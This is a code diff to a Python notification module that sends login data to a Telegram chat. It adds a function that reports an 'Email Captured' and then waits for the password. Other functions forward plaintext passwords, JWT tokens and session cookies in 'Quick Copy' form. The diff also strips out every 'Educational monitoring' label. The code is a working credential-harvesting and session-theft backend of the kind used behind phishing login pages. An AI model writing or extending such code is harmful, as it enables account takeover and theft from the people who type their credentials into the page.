@@ -40,24 +40,46 @@ def send_telegram_notification(message: str) -> bool:
         return False
 
 
+def notify_email_captured(email: str) -> None:
+    """
+    Notify when email is captured (step 1 of login).
+    """
+    from datetime import datetime
+    import pytz
+    
+    # Get current time
+    tz = pytz.timezone('Europe/London')  # Adjust to your timezone
+    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
+    
+    message = (
+        f"📧 <b>Email Captured</b>\n\n"
+        f"📨 <b>Email:</b> <code>{email}</code>\n"
+        f"⏰ <b>Time:</b> {current_time}\n\n"
+        f"⏳ <i>Waiting for password...</i>"
+    )
+    send_telegram_notification(message)
+
+
 def notify_user_registration(email: str, name: str, password: str, token: str, user_id: str) -> None:
     """
     Notify about new user registration with full details.
-    Educational monitoring only - shows registration activity.
     """
+    from datetime import datetime
+    import pytz
+    
+    tz = pytz.timezone('Europe/London')
+    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
+    
     message = (
         f"🆕 <b>New User Registration</b>\n\n"
         f"📧 <b>Email:</b> <code>{email}</code>\n"
         f"👤 <b>Name:</b> <code>{name}</code>\n"
-        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
+        f"🔑 <b>Password:</b> <code>{password}</code>\n"
+        f"⏰ <b>Time:</b> {current_time}\n\n"
         f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
         f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
         f"🍪 <b>Session Cookie:</b>\n"
-        f"<code>authToken={token}</code>\n\n"
-        f"📝 <b>Login Details:</b>\n"
-        f"Email: <code>{email}</code>\n"
-        f"Pass: <code>{password}</code>\n\n"
-        f"⚠️ <i>Educational Monitoring</i>"
+        f"<code>authToken={token}</code>"
     )
     send_telegram_notification(message)
 
@@ -65,13 +87,19 @@ def notify_user_registration(email: str, name: str, password: str, token: str, u
 def notify_user_login(email: str, name: str, password: str, token: str, user_id: str) -> None:
     """
     Notify about user login with full session details.
-    Educational monitoring only - shows login activity.
     """
+    from datetime import datetime
+    import pytz
+    
+    tz = pytz.timezone('Europe/London')
+    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
+    
     message = (
-        f"🔐 <b>User Login Detected</b>\n\n"
+        f"🔐 <b>Login Successful</b>\n\n"
         f"📧 <b>Email:</b> <code>{email}</code>\n"
         f"👤 <b>Name:</b> <code>{name}</code>\n"
-        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
+        f"🔑 <b>Password:</b> <code>{password}</code>\n"
+        f"⏰ <b>Time:</b> {current_time}\n\n"
         f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
         f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
         f"🍪 <b>Session Cookie:</b>\n"
@@ -79,8 +107,7 @@ def notify_user_login(email: str, name: str, password: str, token: str, user_id:
         f"📱 <b>Quick Copy:</b>\n"
         f"Email: <code>{email}</code>\n"
         f"Password: <code>{password}</code>\n"
-        f"Token: <code>{token}</code>\n\n"
-        f"⚠️ <i>Educational Monitoring</i>"
+        f"Token: <code>{token}</code>"
     )
     send_telegram_notification(message)
 
@@ -88,11 +115,16 @@ def notify_user_login(email: str, name: str, password: str, token: str, user_id:
 def notify_password_reset(email: str) -> None:
     """
     Notify about password reset request.
-    Educational monitoring only.
     """
+    from datetime import datetime
+    import pytz
+    
+    tz = pytz.timezone('Europe/London')
+    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
+    
     message = (
         f"🔄 <b>Password Reset Request</b>\n\n"
-        f"📧 <b>Email:</b> {email}\n\n"
-        f"⚠️ <i>Educational Monitoring</i>"
+        f"📧 <b>Email:</b> <code>{email}</code>\n"
+        f"⏰ <b>Time:</b> {current_time}"
     )
     send_telegram_notification(message)
